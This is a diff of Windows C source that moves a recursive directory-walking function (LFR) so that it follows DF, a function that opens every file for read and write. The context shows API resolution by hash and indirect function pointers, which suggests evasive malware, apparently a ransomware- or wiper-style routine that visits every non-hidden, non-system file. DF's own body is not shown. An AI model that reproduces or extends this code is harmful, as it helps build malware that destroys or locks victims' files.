@@ -96,42 +96,6 @@ FARPROC GetProcAddressByHash(HMODULE Module, DWORD Hash)
 	return NULL;
 }
 
-void LFR(const char *Path)
-{
-	WIN32_FIND_DATAA FindFileData;
-	HANDLE FindFile = INVALID_HANDLE_VALUE;
-	char SearchPath[MAX_PATH];
-
-	snprintf(SearchPath, MAX_PATH, "%s\\*", Path);
-
-	FindFile = pFindFirstFileA(SearchPath, &FindFileData);
-	if (FindFile == INVALID_HANDLE_VALUE)
-	{
-		return;
-	}
-
-	do
-	{
-		if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0)
-		{
-			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-			{
-				char subPath[MAX_PATH];
-				snprintf(subPath, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
-				LFR(subPath);
-			}
-			else
-			{
-				char NewPathToFile[MAX_PATH];
-				snprintf(NewPathToFile, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
-				DF(NewPathToFile);
-			}
-		}
-	} while (pFindNextFileA(FindFile, &FindFileData) != 0);
-
-	pFindClose(FindFile);
-}
-
 int DF(const char *NewPathToFile)
 {
 	HANDLE File = pCreateFileA(NewPathToFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 3, 128, NULL);
@@ -173,6 +137,42 @@ int DF(const char *NewPathToFile)
 	}
 
 	return 0;
+}
+
+void LFR(const char *Path)
+{
+	WIN32_FIND_DATAA FindFileData;
+	HANDLE FindFile = INVALID_HANDLE_VALUE;
+	char SearchPath[MAX_PATH];
+
+	snprintf(SearchPath, MAX_PATH, "%s\\*", Path);
+
+	FindFile = pFindFirstFileA(SearchPath, &FindFileData);
+	if (FindFile == INVALID_HANDLE_VALUE)
+	{
+		return;
+	}
+
+	do
+	{
+		if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0)
+		{
+			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+			{
+				char subPath[MAX_PATH];
+				snprintf(subPath, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
+				LFR(subPath);
+			}
+			else
+			{
+				char NewPathToFile[MAX_PATH];
+				snprintf(NewPathToFile, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
+				DF(NewPathToFile);
+			}
+		}
+	} while (pFindNextFileA(FindFile, &FindFileData) != 0);
+
+	pFindClose(FindFile);
 }
 
 int REDR(const char *Path)
